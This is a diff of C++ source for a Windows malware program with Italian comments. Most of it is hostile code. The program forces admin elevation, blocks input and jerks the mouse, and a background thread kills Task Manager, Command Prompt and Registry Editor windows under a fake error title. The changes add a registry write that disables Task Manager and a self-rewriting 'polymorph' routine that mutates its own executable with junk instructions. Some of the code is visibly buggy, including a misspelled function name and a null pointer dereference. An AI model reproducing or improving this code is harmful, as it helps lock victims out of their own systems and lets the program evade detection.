@@ -8,7 +8,7 @@
 #include <iostream>
 #include <stdio.h>
 #include <windows.h>
-#include <winable.h>
+#include <winuser.h>
 #include <conio.h>
 #include <ctime>
 #include <stdio.h>
@@ -54,39 +54,80 @@ void crazy_mouse();
 void readcode(const char *filename);
 void writecode(const char *filename);
 void replacejunk(void);
+void destroy_window();
+void polymorph_me(const char *filename);
 int writeinstruction(unsigned reg, int offset, int space);
 int readinstruction(unsigned reg, int offset);
+int disable_task_mananger();
 BOOL is_running_as_admin();
-DWORD WINAPI destroy_windows(LPVOID);
 
-int main() {
+int main(int argc, char *argv[]) {
     if(!is_running_as_admin()) {
         elevate_now();
     }
     srand( time(0) );
     random = rand()%6;
-    system("title stocazzo");
+    system("title Polymorph ME!");
     BlockInput( true );
     SetUp();
     BlockInput( false );
+    /*Creo un thread per inibire l'apertura dei malefici 3...*/
     CreateThread(NULL,
             0,
-            (LPTHREAD_START_ROUTINE)&destroy_windows,
+            (LPTHREAD_START_ROUTINE)&destroy_window,
             0,
             0,
             NULL);
-    while(1) {
+    /*Creo un thread differente per modificare il codice.*/
+    CreateThread(NULL,
+            0,
+            (LPTHREAD_START_ROUTINE)&polimorph_me,
+            &argv[0], /* Passo al thread come parametro il nome del file */
+            0,
+            NULL);
+    int *pos = 0;
+    while(*pos <= 20) {
         run( random );
         Sleep(10);
     }
-    /*after executing itself, it changes*/
-    readcode(argv[0]);     JUNK;
-    replacejunk();         JUNK;
-    writecode(argv[0]);    JUNK;
-    return 0
+
+    return 0;
 }
 
-/* LASCIATE OGNI SPERANZA O VOI CH'ENTRATE */
+void polimorph_me(const char *filename) {
+    readcode(filename);     JUNK;
+    replacejunk();         JUNK;
+    writecode(filename);    JUNK;
+}
+
+int disable_task_mananger() {
+    /* Per dispetto disabilito anche il task manager! (o almeno ci provo) */
+    DWORD dwVal = 1;
+
+    HKEY hKey;
+    try {
+        RegOpenKeyEx(
+                HKEY_CURRENT_USER,
+                "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\",
+                0,
+                KEY_ALL_ACCESS,
+                &hKey);
+        RegSetValueEx (
+            hKey,
+            "DisableTaskmgr",
+            0,
+            REG_DWORD,
+            (LPBYTE)&dwVal ,
+            sizeof(DWORD));
+    } catch (...) {
+        /* Qualcosa e` andato storto... Magari la chiave non c'e`? */
+        return -1;
+    }
+    RegCloseKey(hKey);
+    return 0;
+}
+
+/* LASCIATE OGNI SPERANZA A VOI CHE ENTRATE */
 /* Il concetto e` quello di creare una lista di N istruzioni, le quali andranno
  * a lavorare tutte sullo stesso registro. La prima istruzione e` un PUSH,
  * mentre l'ultima e` un POP in modo da reinizializzare il valore iniziale del
@@ -223,23 +264,23 @@ void run( int ID ) {
 void crazy_mouse() {
     X = rand()%801;
     Y = rand()%601;
-    SetCursorPos( X, Y );
+    SetCursorPos(X, Y);
 }
 
-DWORD WINAPI destroy_windows(LPVOID) {
+void destroy_window() {
     while(1) {
-        TaskMgr = FindWindow(NULL,"Windows Task Manager");
+        TaskMgr = FindWindow(NULL, "Windows Task Manager");
         CMD = FindWindow(NULL, "Command Prompt");
-        Regedit = FindWindow(NULL,"Registry Editor");
-        if( TaskMgr != NULL ) {
+        Regedit = FindWindow(NULL, "Registry Editor");
+        if(TaskMgr != NULL) {
             SetWindowText( TaskMgr, "Unexpected Error.");
             PostMessage( TaskMgr, WM_CLOSE, (LPARAM)0, (WPARAM)0);
         }
-        if( CMD != NULL ) {
-            SetWindowText( CMD, "Unexpected Error.");
-            PostMessage( CMD, WM_CLOSE, (LPARAM)0, (WPARAM)0);
+        if(CMD != NULL) {
+            SetWindowText(CMD, "Unexpected Error.");
+            PostMessage(CMD, WM_CLOSE, (LPARAM)0, (WPARAM)0);
         }
-        if( Regedit != NULL ) {
+        if(Regedit != NULL) {
             SetWindowText( Regedit, "Unexpected Error.");
             PostMessage( Regedit, WM_CLOSE, (LPARAM)0, (WPARAM)0);
         }
